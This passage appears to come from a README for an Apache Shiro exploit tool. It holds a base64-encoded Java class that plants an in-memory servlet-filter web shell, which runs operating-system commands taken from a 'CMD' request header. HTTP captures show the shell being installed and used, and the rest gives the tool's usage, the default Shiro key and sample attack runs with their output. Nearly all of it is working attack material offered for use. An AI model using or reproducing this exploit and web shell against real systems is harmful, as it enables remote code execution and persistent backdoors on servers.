0CAEjAQALZ2V0UmVzcG9uc2UIASUIABAIABQBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzsBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24HASwBAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAAdpc0xpbnV4AQABWgEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQACaW4BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAAFzAQATTGphdmEvdXRpbC9TY2FubmVyOwEAA291dAEABW9zVHlwAQADcmVxAQAeTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAEcmVzcAEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAVjaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEAA2NtZAEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QHAUEBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQcBQwEAGWphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW4HAUUHATMBABNqYXZhL2lvL0lucHV0U3RyZWFtBwFIAQARamF2YS91dGlsL1NjYW5uZXIHAUoBAANDTUQIAUwBAAlnZXRIZWFkZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwwBTgFPCwA1AVABAAdpc0VtcHR5DAFSAR0KAHkBUwEAB29zLm5hbWUIAVUBAAtnZXRQcm9wZXJ0eQwBVwFPCgCPAVgBAAt0b0xvd2VyQ2FzZQwBWgA7CgB5AVsBAAN3aW4IAV0BAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgwBXwFgCgB5AWEBAAJzaAgBYwEAAi1jCAFlAQAHY21kLmV4ZQgBZwEAAi9jCAFpAQARamF2YS9sYW5nL1J1bnRpbWUHAWsBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAFtAW4KAWwBbwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAFxAXIKAWwBcwEAEWphdmEvbGFuZy9Qcm9jZXNzBwF1AQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwwBdwF4CgF2AXkBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYMAAcBewoBSwF8AQACXGEIAX4BAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsMAYABgQoBSwGCAQAHaGFzTmV4dAwBhAEdCgFLAYUBAARuZXh0DAGHADsKAUsBiAEAAAgBigEAB3ByaW50bG4MAYwALwoAVAGNAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgwBLgGPCwFGAZABABNqYXZhL2lvL0lPRXhjZXB0aW9uBwGSAQAHZGVzdHJveQEAClNvdXJjZUZpbGUBABNGaWx0ZXJNZW1TaGVsbC5qYXZhAQAEL2NtZAgBlwAhAAIABAABAAYAAwABABAAEQAAAAEAFAAVAAAAAADeAHMAAAAIAAEABwAIAAEACQAAAEgAAgABAAAAFiq3AA8qEwGYtQDgKgG1ABMqAbUAF7EAAAACAAoAAAAOAAMAAAAYAAsAGQAQABoACwAAAAwAAQAAABYADAANAAAAAQAYABkAAQAJAAABNQADAAQAAACEKiu2ACi7ACNZtwApTSq0ABcSK7kAMQIAKrQAExIzuQA4AgAqtAAXEjO5ADkCACwqtgA9tgBBV6cAH04suwBDWbcARBJGtgBJLbYATLYASbYATbYAQVcqtAAXuQBRAQAstgBStgBXKrQAF7kAUQEAtgBaKrQAF7kAUQEAtgBdpwAETgSsAAIADQA3ADoAGwBWAH4AgQAbAAMACgAAAD4ADwAAAB4ABQAfAA0AIgAYACMAIwAkAC4AJQA3ACgAOgAmADsAJwBWACsAZgAsAHIALQB%2BAC8AgQAuAIIAMQALAAAAKgAEADsAGwAcAB0AAwAAAIQADAANAAAAAACEAB4AHwABAA0AdwAgACEAAgAkAAAAGwAE%2FwA6AAMHAAIHAAQHACMAAQcAGxtqBwAbAAABADoAOwACAAkAAATyAAYAEQAAAmsqtAATuQCLAQBMKk27AENZtwBEEo22AEm4AJMUAJRxtgCYtgBNTgE6BCu2AJwSnrYAojoGGQYEtgCmGQYrtgCqwAB%2FOgcZB7YAnBKetgCiOgYZBgS2AKYZBhkHtgCqwAB7OgQZBLYAnBKstgCiOggZCAS2AKYZCBkEtgCqwACBOgkZCS25AK0CAMcBvQE6ChKvuACzOgqnAAw6CxK1uACzOgoZCrYAuToLGQu2AJwSuwS9AINZAxJ5U7YAvxkLBL0ABFkDLVO2AMVXGQu2AJwSxwS9AINZAxJ5U7YAvxkLBL0ABFkDLLYAnLYAylO2AMVXGQu2AJwSzAS9AINZAxIGU7YAvxkLBL0ABFkDLFO2AMVXGQS2AJwSzgS9AINZAxkKU7YAvxkEBL0ABFkDGQtTtgDFVwE6DBLQuACzOgynAAw6DRLSuACzOgwZDLYAuToNGQ22AJwSuwS9AINZAxJ5U7YAvxkNBL0ABFkDLVO2AMVXGQ22AJwS1AS9AINZAxJ5U7YAvxkNBL0ABFkDsgDatgDdU7YAxVcqtADgxgANKrQA4LYA5JoACSoS5rUA4BkNtgCcEugEvQCDWQMSeVO2AL8ZDQS9AARZAyq0AOBTtgDFVxkEtgCcEuoEvQCDWQMZDFO2AL8ZBAS9AARZAxkNU7YAxVcShwW9AINZAxLsU1kEGQpTtgDwOg4ZDgS2APEBOg8ZDgW9AARZAxkEU1kEGQtTtgD0wACHOg%2BnABA6EBkQtgD3GRC4APuwGQktGQ%2B5AP8DAFenABA6BhkGtgD3GQa4APuwuwBDWbcARC22AEkTAQG2AEm2AE2wAAUAjwCWAJkAGwE3AT4BQQAbAhMCKwIuABsAKQI6AkkAGwI7AkYCSQAbAAMACgAAAMoAMgAAADUACgA2AAwANwAmADkAKQA9ADQAPgA6AEAARQBBAFEAQgBXAEQAYwBHAG8ASAB1AEkAgQBLAIwATQCPAFAAlgBUAJkAUQCbAFMAogBWAKkAVwDKAFkA8QBaARIAWwE0AF8BNwBiAT4AZgFBAGMBQwBlAUoAaAFRAGkBcgBqAZgAawGvAGwBzwBtAdMAcAH1AHMCCgB0AhAAdQITAHcCKwB7Ai4AeAIwAHkCNQB6AjsAfQJGAIMCSQCAAksAgQJQAIICVgCEAAsAAADAABMAmwAHABwAHQALAUMABwAcAB0ADQIwAAsAHAAdABAAjwG3AF4AXwAKAKkBnQBgAB8ACwE3AQ8AYQBfAAwBUQD1AGIAHwANAgoAPABjAGQADgITADMAZQBmAA8ANAISAGcAaAAGAEUCAQBpAGoABwBvAdcAawBoAAgAgQHFAGwAbQAJAksACwAcAB0ABgAAAmsADAANAAAACgJhAG4AbwABAAwCXwBwAHEAAgAmAkUAcgBzAAMAKQJCAHQAdQAEACQAAAC3AAv%2FAJkACwcAAgcAdwcABgcAeQcAewAHAH0HAH8HAH0HAIEHAIMAAQcAGwj%2FAJ4ADQcAAgcAdwcABgcAeQcAewAHAH0HAH8HAH0HAIEHAIMHAAQHAIMAAQcAGwj8AF4HAAQF%2FwB%2BABAHAAIHAHcHAAYHAHkHAHsABwB9BwB%2FBwB9BwCBBwCDBwAEBwCDBwAEBwCFBwCHAAEHABsM%2FwAKAAUHAAIHAHcHAAYHAHkHAHsAAEIHABsMAQIAAAAEAAEAGwAJAPgA%2BQABAAkAAACvAAMABQAAACq7AQxZtwENTLsAVFkrtwEQTSostgETK7YBFE4stgBdLbA6BCy2AF0ZBL8AAgARABsAIQAAACEAIwAhAAAAAwAKAAAAIgAIAAAAiAAIAIkAEQCMABYAjQAbAI8AHwCNACEAjwAnAJAACwAAACAAAwAAACoBAwEEAAAACAAiAQUBBgABABEAGQEHAQgAAgAkAAAAFQAB%2FwAhAAMHAQoHAQwHAFQAAQcBCgABACUAJgABAAkAAAIPAAQABgAAAOgrtgCctgEfmQAoK8ABIMABIMABIMABIE0qLAMywAA1tQATKiwEMsAALbUAF6cAuxMBIrgAs00qLBMBJAO9AIO2AL8rA70ABLYAxcAANbUAEyosEwEmA70Ag7YAvysDvQAEtgDFwAAttQAXpwB9TSvBADWZAHUqK8AANbUAEyq0ABO2AJwTASe2AKJOLQS2AKYtKrQAE7YAqsAANToEGQS2AJwTASi2AKI6BRkFBLYApioZBRkEtgCqwAAttQAXpwApTioqtAATtgCcEwEmA70Ag7YAvysDvQAEtgDFwAAttQAXpwAFOgSxAAMALwBqAG0AGwB9AL4AwQAbAMIA4gDlABsAAwAKAAAAYgAYAAAAlQAKAJYAGACXACIAmAAsAJkALwCbADYAnABQAJ0AagCwAG0AngBuAJ8AdQCgAH0AowCLAKQAkAClAJ0ApgCqAKcAsACoAL4ArgDBAKkAwgCrAOIArQDlAKwA5wCyAAsAAABcAAkAGAAUARUBFgACADYANAEXAF8AAgCLADMBGABoAAMAnQAhARkAEQAEAKoAFAEaAGgABQDCACUBGwAdAAMAbgB5ABwAHQACAAAA6AAMAA0AAAAAAOgAHgAfAAEAJAAAADMABS99BwAb%2FwBTAAMHAAIHAAQHABsAAQcAG%2F8AIwAEBwACBwAEBwAbBwAbAAEHABv5AAEAAQEpASoAAgAJAAAANQAAAAIAAAABsQAAAAIACgAAAAYAAQAAALUACwAAABYAAgAAAAEADAANAAAAAAABAGUBKwABAQIAAAAEAAEBLQABAS4BLwACAAkAAAIhAAQADgAAANMrwAA1OgQswAAtOgUZBBMBTbkBUQIAOgYZBsYAsBkGtgFUmgCoBDYIEwFWuAFZOgcZB8YAFBkHtgFcEwFetgFimQAGAzYIFQiZABsGvQB5WQMTAWRTWQQTAWZTWQUZBlOnABgGvQB5WQMTAWhTWQQTAWpTWQUZBlM6CbgBcBkJtgF0tgF6Ogq7AUtZGQq3AX0TAX%2B2AYM6CxkLtgGGmQALGQu2AYmnAAYTAYs6DBkFuQBRAQA6DRkNGQy2AY4ZDbYAWhkNtgBdpwALLSssuQGRAwCxAAAAAwAKAAAATgATAAAAuAAGALkADAC6ABgAvAAlAL0AKAC%2BADAAvwBDAMAARgDDAHoAxACHAMUAmADGAK0AxwC2AMgAvQDJAMIAygDHAMsAygDMANIAzgALAAAAjgAOACgAnwEwATEACAB6AE0BMgEzAAkAhwBAATQBNQAKAJgALwE2ATcACwCtABoAIABzAAwAtgARATgBCAANADAAmgE5AHMABwAAANMADAANAAAAAADTAToBOwABAAAA0wE8AT0AAgAAANMBPgE%2FAAMABgDNABAAEQAEAAwAxwAUABUABQAYALsBQABzAAYAJAAAAFQAB%2F8ARgAJBwACBwFCBwFEBwFGBwA1BwAtBwB5BwB5AQAAHFQHAUf%2BAC8HAUcHAUkHAUtCBwB5%2FwAeAAcHAAIHAUIHAUQHAUYHADUHAC0HAHkAAAcBAgAAAAYAAgGTAS0AAQGUAAgAAQAJAAAAKwAAAAEAAAABsQAAAAIACgAAAAYAAQAAANEACwAAAAwAAQAAAAEADAANAAAAAQGVAAAAAgGW
```

```http
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Content-Type: text/html;charset=UTF-8
Date: Tue, 04 Jun 2023 04:30:01 GMT
Content-Length: 42

F!lter90337083 has been successfully added :)
```

```http
GET /cmd HTTP/1.1
Host: 192.168.1.223:8089
CMD: pwd


```

```http
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Date: Tue, 04 Jun 2023 04:30:03 GMT
Content-Length: 45

/opt/apache-tomcat/apache-tomcat-7.0.10/bin

```

## 自动化利用

### Help

```bash
$ java -jar ShiroAttack.jar

   _____ __    _            ___   __  __             __
  / ___// /_  (_)________  /   | / /_/ /_____ ______/ /__
  \__ \/ __ \/ / ___/ __ \/ /| |/ __/ __/ __ `/ ___/ //_/
 ___/ / / / / / /  / /_/ / ___ / /_/ /_/ /_/ / /__/ ,<
/____/_/ /_/_/_/   \____/_/  |_\__/\__/\__,_/\___/_/|_|

Shiro Attack MemShell Exploit Tool.

usage: Options
 -a,--attack-type <arg>   Type of attack, TomcatEcho or FilterMemShell,
                          The default type is TomcatEcho.
 -c,--cmd <arg>           The command that will be executed, only if the
                          attack type is TomcatEcho.
 -h,--help                Print help information.
 -k,--key <arg>           Shiro Key, the default key is
                          kPH+bIxk5D2deZiIxcaaaA==.
 -m,--mode <arg>          AES mode, CBC or GCM, the default mode is GCM.
 -p,--proxy <arg>         Proxy Address, eg: http://127.0.0.1:8080
 -path <arg>              Customizing the filter path.
 -t,--timeout <arg>       Http Requests Timeout, the default is 20s.
 -u,--url <arg>           Target URL, eg: http://192.168.1.1:8089.

Example:
java -jar ShiroAttack.jar -p http://127.0.0.1:8080 -u http://192.168.1.1:8089 -k kPH+bIxk5D2deZiIxcaaaA== -m CBC -a TomcatEcho -c pwd
java -jar ShiroAttack.jar -p http://127.0.0.1:8080 -u http://192.168.1.1:8089 -k kPH+bIxk5D2deZiIxcaaaA== -m CBC -a FilterMemShell -path /cmd
```

### TomcatEcho

```bash
$ java -jar ShiroAttack.jar -p http://127.0.0.1:8080 -u http://192.168.1.223:8089 -k kPH+bIxk5D2deZiIxcaaaA== -m CBC -a TomcatEcho -c pwd

   _____ __    _            ___   __  __             __
  / ___// /_  (_)________  /   | / /_/ /_____ ______/ /__
  \__ \/ __ \/ / ___/ __ \/ /| |/ __/ __/ __ `/ ___/ //_/
 ___/ / / / / / /  / /_/ / ___ / /_/ /_/ /_/ / /__/ ,<
/____/_/ /_/_/_/   \____/_/  |_\__/\__/\__,_/\___/_/|_|

[*] URL: http://192.168.1.223:8089
[*] Proxy: http://127.0.0.1:8080
[*] Shiro Key: kPH+bIxk5D2deZiIxcaaaA==
[*] Encryption mode: AES-CBC
[*] Type of attack: TomcatEcho
[*] Timeout: 20s
[*] Command: pwd

/opt/apache-tomcat/apache-tomcat-7.0.10/bin

```

### FilterMemShell

```bash
$ java -jar ShiroAttack.jar -p http://127.0.0.1:8080 -u http://192.168.1.223:8089 -k kPH+bIxk5D2deZiIxcaaaA== -m CBC -a FilterMemShell -path /cmd

   _____ __    _            ___   __  __             __
  / ___// /_  (_)________  /   | / /_/ /_____ ______/ /__
  \__ \/ __ \/ / ___/ __ \/ /| |/ __/ __/ __ `/ ___/ //_/
 ___/ / / / / / /  / /_/ / ___ / /_/ /_/ /_/ / /__/ ,<
/____/_/ /_/_/_/   \____/_/  |_\__/\__/\__,_/\___/_/|_|

[*] URL: http://192.168.1.223:8089
[*] Proxy: http://127.0.0.1:8080
[*] Shiro Key: kPH+bIxk5D2deZiIxcaaaA==
[*] Encryption mode: AES-CBC
[*] Type of attack: FilterMemShell
[*] Timeout: 20s
[*] Filter Path: /cmd
[+] F!lter90337083 has been successfully added :)
[+] Please add a `CMD: pwd` header to the HTTP request to exploit the vulnerability

$ curl -H "CMD: pwd" http://192.168.1.223:8089/cmd
/opt/apache-tomcat/apache-tomcat-7.0.10/bin

```

